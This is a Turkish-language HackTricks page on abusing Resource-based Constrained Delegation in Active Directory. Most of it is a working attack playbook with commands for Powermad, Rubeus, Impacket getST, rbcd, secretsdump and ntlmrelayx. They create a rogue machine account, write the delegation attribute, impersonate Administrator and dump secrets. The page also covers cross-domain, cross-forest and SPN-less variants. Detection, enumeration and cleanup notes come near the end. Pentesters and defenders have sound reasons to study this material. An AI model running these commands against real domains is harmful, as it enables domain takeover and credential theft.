# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerdir ancak **bunun yerine**, bir **object**'e **bir makineye karşı herhangi bir user'ı taklit etme** izinleri vermek yerine, Resource-based Constrain Delegation, **kendisine karşı herhangi bir user'ı kimin taklit edebileceğini object içinde ayarlar**.

Bu durumda, constrained object, kendisine karşı başka herhangi bir user'ı taklit edebilecek user'ın adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir attribute'a sahip olur.

Bu Constrained Delegation ile diğer delegation türleri arasındaki bir diğer önemli fark, **bir machine account üzerinde write permissions** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) sahibi olan herhangi bir user'ın **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (diğer Delegation türlerinde domain admin privs gerekiyordu).

### Yeni Kavramlar

Constrained Delegation bölümünde, user'ın _userAccountControl_ değerinin içindeki **`TrustedToAuthForDelegation`** flag'inin bir **S4U2Self** gerçekleştirmek için gerekli olduğu söylenmişti. Ancak bu tamamen doğru değildir.\
Gerçekte, bu değer olmadan da **service** iseniz (bir SPN'iniz varsa) herhangi bir user'a karşı **S4U2Self** gerçekleştirebilirsiniz; fakat **`TrustedToAuthForDelegation`** değerine **sahipseniz**, döndürülen TGS **Forwardable** olur ve bu flag'e **sahip değilseniz**, döndürülen TGS **Forwardable** **olmaz**.

Bununla birlikte, **S4U2Proxy** içinde kullanılan **TGS** **Forwardable** değilse, temel bir **Constrain Delegation**'ı abuse etmeye çalışmak **çalışmaz**. Ancak bir **Resource-Based constrain delegation** exploit etmeye çalışıyorsanız bu çalışır.

### Attack yapısı

> Bir **Computer** account üzerinde **write equivalent privileges** sahibiyseniz, o makinede **privileged access** elde edebilirsiniz.

Saldırganın victim computer üzerinde zaten **write equivalent privileges** sahibi olduğunu varsayalım.

1. Saldırgan, **SPN**'e sahip bir account'u ele geçirir veya bir tane **oluşturur** (“Service A”). Herhangi bir özel privilege'a sahip olmayan herhangi bir _Admin User_'ın **10 adede kadar Computer object** oluşturabileceğini (**_MachineAccountQuota_**) ve bunlara bir **SPN** ayarlayabileceğini unutmayın. Dolayısıyla saldırgan yalnızca bir Computer object oluşturup bir SPN ayarlayabilir.
2. Saldırgan, victim computer (ServiceB) üzerindeki **WRITE privilege**'ını **resource-based constrained delegation**'ı, ServiceA'nın bu victim computer'a (ServiceB) karşı herhangi bir user'ı taklit etmesine izin verecek şekilde yapılandırmak için **abuse eder**.
3. Saldırgan, Service A'dan Service B'ye, Service B üzerinde **privileged access** sahibi bir user için **full S4U attack** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
1. S4U2Self (ele geçirilmiş/oluşturulmuş SPN account'undan): **Administrator'dan bana** bir **TGS** ister (Not Forwardable).
2. S4U2Proxy: Önceki adımın **not Forwardable TGS**'ini kullanarak **Administrator**'dan **victim host**'a bir **TGS** ister.
3. **Resource-based constrained delegation** exploit edildiği için, not Forwardable bir TGS kullanıyor olsanız bile bu çalışır.
4. Saldırgan **pass-the-ticket** yapabilir ve victim ServiceB'ye **access** elde etmek için user'ı **impersonate** edebilir.

Domain'ın _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak domain içinde bir bilgisayar nesnesi oluşturabilirsiniz:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation'ı Yapılandırma

**activedirectory PowerShell module kullanarak**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview Kullanımı**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Eksiksiz bir S4U attack gerçekleştirme (Windows/Rubeus)

Her şeyden önce, `123456` parolasıyla yeni bir Computer object oluşturduk; bu nedenle bu parolanın hash değerine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 ve AES hash'lerini yazdıracaktır.\
Artık saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak yalnızca bir kez istekte bulunup daha fazla service için daha fazla ticket oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Cannot be delegated**" adlı bir attribute'a sahip olduğunu unutmayın. Bir kullanıcıda bu attribute True olarak ayarlanmışsa onu impersonate edemezsiniz. Bu özellik BloodHound içinde görülebilir.

### Linux tooling: Impacket ile uçtan uca RBCD (2024+)

Linux üzerinden çalışıyorsanız, resmi Impacket araçlarını kullanarak RBCD zincirinin tamamını gerçekleştirebilirsiniz:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
- AES key'lerini tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus, yalnızca AES kullanılan flow'ları destekler.
- Impacket bazı araçlar için `sname` ("AnySPN") değerini yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Kontrol ettiğiniz **delegating principal**, **resource computer** ile **farklı bir domain**'de (hatta **farklı bir forest**'ta) bulunuyorsa abuse hâlâ **RBCD**'dir; ancak ticket flow artık olağan tek-domain `S4U2Self -> S4U2Proxy` akışı değildir.

### Cross-domain RBCD: foreign principal'ı SID ile yapılandırma

`msDS-AllowedToActOnBehalfOfOtherIdentity` değerini **farklı bir domain**'den ayarladığınızda, foreign machine/user hedef domain LDAP'ında **name** ile çözümlenemeyebilir. Bu durumda delegation entry'yi foreign principal'ın sAMAccountName/UPN'si yerine **SID**'sini kullanarak yapılandırın.

Bu, özellikle NTLM'yi LDAP'a `ntlmrelayx.py` ile relay ederken önemlidir:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notlar:
- `--sid`, `ntlmrelayx.py` aracına `--escalate-user` değerini SID olarak ele almasını söyler; delegating account hedef domain'e foreign olduğunda bu gereklidir.
- Araç `User not found in LDAP` çıktısını verse bile delegation write başarılı olabilir; çünkü security descriptor foreign SID'yi doğrudan depolar.

### Cross-domain RBCD: cross-realm S4U sequence

Foreign principal `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra çalışan cross-domain akışı şöyledir:

1. Delegating principal için kendi domain'inden bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
3. Target-domain DC üzerinde impersonated user için bir **cross-realm S4U2Self referral** isteyin.
4. Bu user için gerçek **S4U2Self** ticket'ını delegator domain'e geri dönerek isteyin.
5. Delegator domain içinde **S4U2Proxy** gerçekleştirerek target domain için bir referral ticket alın.
6. `cifs/host.target`, `host/host.target` vb. için service ticket elde etmek üzere target-domain DC üzerinde son **S4U2Proxy** işlemini gerçekleştirin.

Stock Linux tooling'in cross-domain RBCD'de sıklıkla başarısız olmasının nedeni budur:
- request içindeki **realm**, `TGS-REQ` içinde kullanılan TGT'nin realm'inden farklı olmak zorunda olabilir
- zincir yalnızca `S4U2Self` veya hemen ardından tek bir `S4U2Proxy` gelen `S4U2Self` işleminden değil, **independent S4U2Proxy steps** işlemlerinden oluşmalıdır

### Cross-domain RBCD from Linux

Synacktiv, iki KDC'yi açıkça ele alarak Linux üzerinden cross-realm sequence'i yeniden oluşturan bir Impacket `getST.py` implementation'ı yayımladı:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegating** domain'in DC'si
- `-targetdomain`: **resource computer**'ın domain'i
- `-targetdc`: **resource** domain'in DC'si

### Cross-forest RBCD limitations

Cross-forest RBCD'nin önemli bir sınırlaması vardır: **impersonated user, delegating principal ile aynı forest'a ait olmalıdır**. Başka bir deyişle, kontrolünüzdeki machine account `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, genellikle RBCD üzerinden bu resource'a rastgele `asgard.local` kullanıcılarını **impersonate** edemezsiniz.

Şu durumlarda yine de exploit edilebilir:
- **delegating forest** kullanıcısı, diğer forest'taki resource host üzerinde **local admin** (veya başka şekilde privileged) ise
- Bir trust, gerekli authentication path'e izin veriyorsa ve foreign SID, hedef computer'ın security descriptor'ında kabul ediliyorsa

### Cross-forest RBCD protocol quirks

Cross-forest RBCD yalnızca "cross-domain plus a trust" değildir. Gözlemlenen flow, yaygın tooling'in geçmişte gözden kaçırdığı iki quirk içerir:

1. `PA-PAC-OPTIONS=branch-aware` ayarlayan ek bir **S4U2Proxy** request'i
2. Diğer etypes istenmiş olsa bile **RC4** kullanılarak döndürülebilen son service ticket

Pratik flow şöyledir:

1. Forest A'daki delegating principal için bir TGT alın.
2. Forest A'daki impersonated user için **S4U2Self** isteğinde bulunun.
3. Forest B için bir referral TGT elde etmek üzere Forest A'da **S4U2Proxy** isteğinde bulunun.
4. Forest A'da, **S4U2Self** ticket'ını additional ticket olarak göndermeden, ancak `branch-aware` etkin olacak şekilde ikinci bir **S4U2Proxy** göndererek Forest B için başka bir referral TGT elde edin.
5. İsteğe bağlı olarak Forest B'de delegating principal için normal bir service ticket isteyin (bu ticket final abuse için gerekli değildir).
6. Impersonated forest-A user'ın target SPN'e yönelik final **S4U2Proxy** ticket'ını Forest B'de istemek için 3. ve 4. adımlardaki referral ticket'ları kullanın.

### Cross-forest RBCD from Linux

Aynı Synacktiv Impacket branch'i bu logic için bir `-forest` switch'i ekler:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domain)

**multi-domain forests** içinde hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **recursive** olabilir:

- **Recursive S4U2Self**: ilk `S4U2Self`, **impersonated user's domain** üzerine gönderilir; ara parent/child geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referrals ile gerçekleştirilir ve **final `S4U2Self`**, **delegating principal's own domain** üzerine gönderilir.
- Bu, yalnızca bir makine hesabı için **TGT** bulundurmanın, **aynı forest** içindeki başka bir domainden bir **admin** kullanıcısını impersonate etmek ve `cifs/host`, `host/host`, `wsman/host` vb. istemek için yeterli olabileceği anlamına gelir.
- **Recursive S4U2Proxy** trust chain'i aynı şekilde takip eder: ara geçişlerde, sonraki `krbtgt/<REALM>` referral'ını isterken önceki ticket TGT olarak yeniden kullanılır ve yalnızca son hop final service ticket'ını döndürür.

Pratik bir same-forest örneği şöyledir:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN'siz etki alanları arası / forest'lar arası RBCD

**Delegating principal bir SPN'siz user ise**, son recursive `S4U2Self`, **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Geçici çözüm, yalnızca son hop'u **`S4U2Self+U2U`** olarak yeniden denemektir.

Abuse chain'in kısa özeti:

1. KDC'nin **RC4-HMAC (etype 23)** kullanmaya yönelmesi için **NT hash** ile authenticate olun.
2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT session key** değerini çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak user's **NT hash** değerini bu **session key** ile değiştirin.
5. `S4U2Self+U2U` ticket'ını ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- **first trusted hop is already another forest** olduğunda, native Windows davranışıyla eşleşmesi için **branch-aware** algoritmayı (`getST.py ... -forest`) tercih edin. Foreign forest zincirde yalnızca **daha sonra** erişiliyorsa, **branch-aware olmayan** recursive flow yine de çalışabilir.
- Güncel **Windows Server 2022/2025** DC'lerinde, RC4 deprecation nedeniyle zorunlu RC4 **`KDC_ERR_ETYPE_NOSUPP`** hatasıyla başarısız olabilir; bu durum, classic SPN-backed RBCD'nin AES ile çalışmasına rağmen **SPN-less RBCD**'yi imkansız hale getirebilir.
- Kullanıcının hash/password değerini değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: `SamrChangePasswordUser`, hesabın Kerberos AES key'lerini yeniden hesaplamaz; bu nedenle password change işlemini önce yapmak sonraki ticket request işlemlerini bozabilir.
- Impersonate edilen account hâlâ **delegable** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarına sahip account'lar chain'i engeller.

## Detection / hardening notes

- Domain/forest'ler arasındaki RBCD path'leri hâlâ genellikle **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın setup path'lerini engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
- Computer object'leri üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` yazma yetkisine sahip olanları audit edin ve **foreign security principals** dahil olmak üzere kaydedilen SID'leri çözümleyin.
- Trust ağırlıklı ortamlarda **Selective Authentication**, **SID filtering** ve foreign forest'tan gelen kullanıcıların resource host'lar üzerinde **local admin** haklarına sahip olup olmadığını inceleyin.

### Erişim

The last command line, Administrator'dan victim host üzerindeki **memory** içine **complete S4U attack** gerçekleştirip TGS'yi **inject** edecektir.\
Bu örnekte Administrator'dan **CIFS** service'i için bir TGS talep edildiğinden **C$**'a erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı service ticket'larını kötüye kullanma

[**Mevcut service ticket'ları buradan öğrenin**](silver-ticket.md#available-services).

## Listeleme, denetleme ve temizleme

### RBCD yapılandırılmış bilgisayarları listeleme

PowerShell (SID'leri çözümlemek için SD'nin kodunu çözme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (tek bir komutla oku veya temizle):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD Temizleme / sıfırlama

- PowerShell (attribute'u temizle):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya rc4, aes128 ve aes256 hash'lerinin tümünü sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal muhtemelen **SPN'e sahip değil**. Normal bir **`S4U2Self`** yerine **`S4U2Self+U2U`** kullanarak **son hop** işlemini yeniden deneyin.
- **SPN-less RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: Güncel DC'ler, `S4U2Self+U2U` + session-key-substitution tekniğinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES ile klasik **SPN-backed** RBCD yolunu deneyin.
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, sağlanan kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine `$` işaretini koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bunun anlamı şu olabilir:
- Taklit etmeye çalıştığınız kullanıcı istenen service'e erişemiyor (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
- İstenen service mevcut değil (winrm için ticket istediğinizde ancak winrm çalışmadığında)
- Oluşturulan fakecomputer, vulnerable server üzerindeki ayrıcalıklarını kaybetmiş ve bu ayrıcalıkları yeniden vermeniz gerekiyor.
- Klasik KCD'yi abuse ediyorsunuz; RBCD'nin forwardable olmayan S4U2Self ticket'larıyla çalıştığını, KCD'nin ise forwardable gerektirdiğini unutmayın.

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain'leri, tek adımda local SYSTEM elde etmek için sıklıkla RBCD ile sona erer. Uygulamalı uçtan uca örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanan bir Kerberos authentication'ını LDAP'a relay edebilir, hedef computer object üzerinde machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` ayarlayabilir ve off-host üzerinden S4U ile hemen **Administrator** taklidi yapabilir.

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Recent syntax içeren hızlı Linux cheatsheet'i: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
